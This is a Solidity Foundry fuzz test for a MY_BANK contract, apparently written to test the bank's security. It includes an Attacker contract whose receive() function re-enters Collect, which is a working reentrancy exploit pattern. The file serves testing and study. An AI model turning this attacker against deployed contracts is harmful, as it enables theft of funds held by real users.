// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract InvMutTest is Test {
    uint256 internal constant VALUE_CAP = 1000000000000000000000000000000;
    MY_BANK c;
    Attacker attacker;

    function setUp() public {
        c = new MY_BANK(address(new Log()));
        attacker = new Attacker(address(c));
    }

    function testFuzz_property(uint256 dep, uint256 am) public {
        vm.assume(dep <= VALUE_CAP);
        dep = bound(dep, 1 ether, 100 ether);
        am = bound(am, 1 ether, 2 ether);

        vm.deal(address(attacker), dep);
        vm.prank(address(attacker));
        c.Put{value: dep}(0);

        (uint256 preUnlock, uint256 preBal) = c.Acc(address(attacker));
        assertTrue(preBal == dep);

        vm.warp(preUnlock + 1);
        attacker.setTarget(am);
        attacker.attack();

        (, uint256 postBal) = c.Acc(address(attacker));
        assertTrue(postBal == preBal);
    }
}

contract Attacker {
    MY_BANK private c;
    uint256 private target;
    bool private entered;

    constructor(address _c) {
        c = MY_BANK(payable(_c));
    }

    function setTarget(uint256 _t) external {
        target = _t;
        entered = false;
    }

    function attack() external {
        c.Collect(target);
    }

    receive() external payable {
        if (!entered) {
            entered = true;
            c.Collect(target);
        }
    }
}
